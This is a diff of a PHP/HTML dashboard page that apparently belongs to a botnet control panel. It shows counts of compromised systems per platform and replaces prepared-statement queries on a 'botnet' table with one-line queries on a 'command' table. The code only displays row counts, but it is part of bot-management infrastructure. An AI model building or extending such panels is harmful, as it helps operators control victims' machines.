@@ -24,44 +24,20 @@
 			<li class="mdl-list__item">
 				<i class="fab fa-windows"></i>
 				<span class="mdl-list__item-primary-content">
-					Windows systems: <?php
-										$stmt = $conn->prepare("SELECT count(*) as total FROM botnet WHERE system='WINDOWS'");
-										$stmt->execute();
-										$result = $stmt->get_result();
-										while ($row = $result->fetch_assoc()) {
-											echo $row[total];
-										}
-										?>
+					Windows systems: <?php echo mysqli_query($conn, "SELECT COUNT(*) FROM command WHERE `system` = 'WINDOWS'")->fetch_column(); ?>
 				</span>
-
 			</li>
 			<li class="mdl-list__item">
 				<i class="fab fa-linux"></i>
 				<span class="mdl-list__item-primary-content">
-					Linux systems (*): <?php
-										$stmt = $conn->prepare("SELECT count(*) as total FROM botnet WHERE system='LINUX'");
-										$stmt->execute();
-										$result = $stmt->get_result();
-										while ($row = $result->fetch_assoc()) {
-											echo $row[total];
-										}
-										?>
+					Linux systems (*): <?php echo mysqli_query($conn, "SELECT COUNT(*) FROM command WHERE `system` = 'LINUX'")->fetch_column(); ?>
 				</span>
-
 			</li>
 			<li class="mdl-list__item">
 				<i class="fab fa-apple"></i>
 				<span class="mdl-list__item-primary-content">
-					macOs systems (*): <?php
-										$stmt = $conn->prepare("SELECT count(*) as total FROM botnet WHERE system='MACOS'");
-										$stmt->execute();
-										$result = $stmt->get_result();
-										while ($row = $result->fetch_assoc()) {
-											echo $row[total];
-										}
-										?>
+					macOs systems (*): <?php echo mysqli_query($conn, "SELECT COUNT(*) FROM command WHERE `system` = 'MACOS'")->fetch_column(); ?>
 				</span>
-
 			</li>
 		</ul>
 		<h5>Mobile</h5>
@@ -69,30 +45,14 @@
 			<li class="mdl-list__item">
 				<i class="fab fa-android"></i>
 				<span class="mdl-list__item-primary-content">
-					Android systems (*): <?php
-											$stmt = $conn->prepare("SELECT count(*) as total FROM botnet WHERE system='ANDROID'");
-											$stmt->execute();
-											$result = $stmt->get_result();
-											while ($row = $result->fetch_assoc()) {
-												echo $row[total];
-											}
-											?>
+					Android systems (*): <?php echo mysqli_query($conn, "SELECT COUNT(*) FROM command WHERE `system` = 'ANDROID'")->fetch_column(); ?>
 				</span>
-
 			</li>
 			<li class="mdl-list__item">
 				<i class="fas fa-mobile"></i>
 				<span class="mdl-list__item-primary-content">
-					iOS systems (*): <?php
-										$stmt = $conn->prepare("SELECT count(*) as total FROM botnet WHERE system='IOS'");
-										$stmt->execute();
-										$result = $stmt->get_result();
-										while ($row = $result->fetch_assoc()) {
-											echo $row[total];
-										}
-										?>
+					iOS systems (*): <?php echo mysqli_query($conn, "SELECT COUNT(*) FROM command WHERE `system` = 'IOS'")->fetch_column(); ?>
 				</span>
-
 			</li>
 		</ul>
 		Note:<br />
